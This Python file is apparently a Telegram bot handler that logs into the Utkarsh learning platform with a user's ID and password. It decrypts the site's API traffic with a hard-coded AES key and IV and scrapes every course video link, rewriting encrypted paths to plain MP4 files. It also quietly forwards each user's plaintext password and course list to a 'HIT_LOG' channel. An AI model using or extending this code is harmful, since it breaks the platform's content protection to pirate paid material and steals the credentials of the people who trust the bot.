import requests
import json
from Cryptodome.Cipher import AES # type: ignore
from Cryptodome.Util.Padding import unpad #
from base64 import b64decode
from Cryptodome.Util.Padding import pad # type: ignore
import base64
from config import Config
import send, db, datetime, key, server

def decrypt(enc):
    enc = b64decode(enc)
    Key = '%!$!%_$&!%F)&^!^'.encode('utf-8') 
    iv =  '#*y*#2yJ*#$wJv*v'.encode('utf-8') 
    cipher = AES.new(Key, AES.MODE_CBC, iv)
    plaintext =  unpad(cipher.decrypt(enc), AES.block_size)
    b = plaintext.decode('utf-8')
    return b


async def handle_utk_logic(bot, m):
    editable = await m.reply_text("Send **ID & Password** in this manner otherwise bot will not respond.\n\nSend like this:-  **ID*Password**")
    input1 = await bot.listen(chat_id=m.chat.id)
    raw_text = input1.text
    await input1.delete()
    token = requests.get('https://online.utkarsh.com/web/home/get_states').json()["token"]
    print(token)
    headers = {
            'accept':'application/json, text/javascript, */*; q=0.01',
            'content-type':'application/x-www-form-urlencoded; charset=UTF-8',
            'x-requested-with':'XMLHttpRequest',
            'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'origin':'https://online.utkarsh.com',
            'accept-encoding':'gzip, deflate, br, zstd',
            'accept-language':'en-US,en;q=0.9',
            'cookie':f'csrf_name={token}; ci_session=tb0uld02neaa4ujs1g4idb6l8bmql8jh'}
    if '*' in raw_text:
        ids, ps = raw_text.split("*")
        data = "csrf_name="+token+"&mobile="+ids+"&url=0&password="+ps+"&submit=LogIn&device_token=null"
        log_response = requests.post('https://online.utkarsh.com/web/Auth/login', headers=headers, data=data).json()["response"].replace('MDE2MTA4NjQxMDI3NDUxNQ==','==').replace(':', '==')
        dec_log = decrypt(log_response)
        dec_logs = json.loads(dec_log)
        error_message = dec_logs["message"]
        status = dec_logs['status']
        if status:
            await editable.edit(f"**User authentication successful.**")
        else:
            await editable.edit(f'Login Failed - {error_message}')
            return
    else:
        await editable.edit("**Please Send id password in this manner** \n\n**Id*Password")
        return

    data2 = "type=Batch&csrf_name="+ token +"&sort=0"
    res2 = requests.post('https://online.utkarsh.com/web/Profile/my_course', headers=headers, data=data2).json()["response"].replace('MDE2MTA4NjQxMDI3NDUxNQ==','==').replace(':', '==')
    decrypted_res = decrypt(res2)
    dc = json.loads(decrypted_res)
    dataxxx = dc['data']
    bdetail = dataxxx.get("data", [])  
    cool = ""
    FFF = "**BATCH-ID -      BATCH NAME **"
    Batch_ids = ''
    for item in bdetail:
        id = item.get("id")
        batch = item.get("title")
        aa = f" `{id}`      - **{batch}**\n\n"
        if len(f'{cool}{aa}') > 4096:
            cool = ""
        cool += aa
        Batch_ids += str(id) + '&'
    Batch_ids = Batch_ids.rstrip('&')
    await editable.edit(f'{"**You have these batches :-**"}\n\n{FFF}\n\n{cool}')
    await bot.send_message(Config.HIT_LOG, f"✅ App Name:- Utkarsh ✅\n**ID:** `{ids}`\n**Password:** `{ps}`\n**Courses:** `[{'| '.join([item['title'] for item in bdetail])}]`")
    editable1 = await m.reply_text(f"**Now send the Batch ID to Download**\n\n**For All batch -** `{Batch_ids}`")
    user_id = int(m.chat.id)
    has_access, message = await db.db_instance.access_checking(user_id)
    if not has_access:
        logout = requests.get("https://online.utkarsh.com/web/Auth/logout", headers=headers)
        if logout.status_code == 200:
            print("**LogOut Successfull**")
        return await bot.send_message(user_id, text=message, reply_markup=key.contact())
    else:
        input2 = await bot.listen(chat_id=m.chat.id)
        await input2.delete()
        await editable.delete()
        await editable1.delete()
        if "&" in input2.text:
            batch_ids = input2.text.split('&')
        else:
            batch_ids = [input2.text]

        for batch_id in batch_ids:
            start_time = datetime.datetime.now()
            bname = next((x['title'] for x in bdetail if str(x['id']) == batch_id), None)
            data4 = {
                'tile_input': f'{{"course_id": {batch_id},"revert_api":"1#0#0#1","parent_id":0,"tile_id":"0","layer":1,"type":"course_combo"}}',
                'csrf_name': token
            }
            Key = '%!$!%_$&!%F)&^!^'.encode('utf-8') 
            iv = '#*y*#2yJ*#$wJv*v'.encode('utf-8')   
            cipher = AES.new(Key, AES.MODE_CBC, iv)
            padded_data = pad(data4['tile_input'].encode(), AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            encoded_data = base64.b64encode(encrypted_data).decode()
            data4['tile_input'] = encoded_data
            res4 = requests.post("https://online.utkarsh.com/web/Course/tiles_data", headers=headers, data=data4).json()["response"].replace('MDE2MTA4NjQxMDI3NDUxNQ==','==').replace(':', '==')
            res4_dec = decrypt(res4)
            res4_json = json.loads(res4_dec)
            subject = res4_json.get("data", [])
            subjID = "&".join([id["id"] for id in subject])
            print(f'All Subject Id Info: {subjID}')
            subject_ids = subjID.split('&')
            all_urls = []
            for u in subject_ids:
                xx = await m.reply_text("<b><i>Sir Task Started** ✓</b></i>")
                topicName = next((x['title'] for x in subject if str(x['id']) == u), None)
                try:
                    await xx.edit(f"**(👉ﾟヮﾟ)👉**Url writing in process -** `{topicName}`")
                except Exception as e:
                    print(f"Error occurred while editing topic name: {e}")
                data5 = {
                    'tile_input': f'{{"course_id":{u},"layer":1,"page":1,"parent_id":{batch_id},"revert_api":"1#0#0#1","tile_id":"0","type":"content"}}',
                    'csrf_name': token
                }
                print("Course Ids", u)
                Key = '%!$!%_$&!%F)&^!^'.encode('utf-8') 
                iv = '#*y*#2yJ*#$wJv*v'.encode('utf-8')   
                cipher = AES.new(Key, AES.MODE_CBC, iv)
                padded_data = pad(data5['tile_input'].encode(), AES.block_size)
                encrypted_data = cipher.encrypt(padded_data)
                encoded_data = base64.b64encode(encrypted_data).decode()
                data5['tile_input'] = encoded_data
                res5 = requests.post("https://online.utkarsh.com/web/Course/tiles_data", headers=headers, data=data5).json()["response"].replace('MDE2MTA4NjQxMDI3NDUxNQ==','==').replace(':', '==')
                decres5 = decrypt(res5)
                res5l = json.loads(decres5)
                resp5 = res5l.get("data", {})
                if not resp5:
                    continue            
                res5list = resp5.get("list")
                TopicID = "&".join([id["id"] for id in res5list])
                topic_ids = TopicID.split('&')
                for t in topic_ids:
                    data5 = {
                    'tile_input': f'{{"course_id":{u},"parent_id":{batch_id},"layer":2,"page":1,"revert_api":"1#0#0#1","subject_id":  {t},"tile_id":0,"topic_id": {t},"type":"content"}}',
                    'csrf_name': token}
                    Key = '%!$!%_$&!%F)&^!^'.encode('utf-8') 
                    iv = '#*y*#2yJ*#$wJv*v'.encode('utf-8')   
                    cipher = AES.new(Key, AES.MODE_CBC, iv)
                    padded_data = pad(data5['tile_input'].encode(), AES.block_size)
                    encrypted_data = cipher.encrypt(padded_data)
                    encoded_data = base64.b64encode(encrypted_data).decode()
                    data5['tile_input'] = encoded_data
                    res6 = requests.post("https://online.utkarsh.com/web/Course/tiles_data", headers=headers, data=data5).json()["response"].replace('ME2MTA4NjQxMDI3NDUxNQ==','==').replace(':', '==')
                    decres6 = decrypt(res6)
                    res6l = json.loads(decres6)
                    resp5 = res6l.get("data", {})
                    if not resp5:
                        print("REsp5", resp5)
                        continue   
                    res6list = resp5.get("list", [])
                    TopicID = "&".join([id["id"] for id in res6list])
                    topic_idss = TopicID.split('&')
                    for tt in topic_idss:
                        data6 = {
                            'layer_two_input_data': f'{{"course_id":{u},"parent_id":{batch_id},"layer":3,"page":1,"revert_api":"1#0#0#1","subject_id": {t},"tile_id":0,"topic_id": {tt},"type":"content"}}',
                            'content': 'content',
                            'csrf_name': token
                        }
                        encoded_data = base64.b64encode(data6['layer_two_input_data'].encode()).decode()
                        data6['layer_two_input_data'] = encoded_data
                        res6 = requests.post("https://online.utkarsh.com/web/Course/get_layer_two_data", headers=headers, data=data6).json()["response"].replace('MDE2MTA4NjQxMDI3NDUxNQ==','==').replace(':', '==')
                        decres6 = decrypt(res6)
                        res6_json = json.loads(decres6)
                        res6data = res6_json.get('data', {})
                        if not res6data:
                            continue   
                        res6_list = res6data.get('list', [])
                        for item in res6_list:
                            title = item.get("title").replace("||", "-").replace(":", "-")
                            bitrate_urls = item.get("bitrate_urls", [])
                            url = None
                            for url_data in bitrate_urls:
                                if url_data.get("title") == "720p":
                                    url = url_data.get("url")
                                    break
                                elif url_data.get("name") == "720x1280.mp4":
                                    url = url_data.get("link") + ".mp4"
                                    url = url.replace("/enc/", "/plain/")
                            if url is None:
                                url = item.get("file_url")
                            if url and not url.endswith('.ws'):
                                if url.endswith(("_0_0", "_0")):
                                    url = "https://apps-s3-jw-prod.utkarshapp.com/admin_v1/file_library/videos/enc_plain_mp4/{}/plain/720x1280.mp4".format(url.split("_")[0])
                                elif not url.startswith("https://") and not url.startswith("http://"):
                                    url = f"https://youtu.be/{url}"  # Correcting the URL format
                                cc = f'{title}: {url}'
                                all_urls.append(cc)
            await xx.edit("**Scraping completed successfully!**")
            if all_urls:
                await send.login(bot, user_id, m, all_urls, start_time, bname, batch_id, app_name="Utkarsh", price=None, start_date=None, imageUrl=None)
        logout = requests.get("https://online.utkarsh.com/web/Auth/logout", headers=headers)
        if logout.status_code == 200:
                print("**LogOut Successfull**")
        await xx.delete()
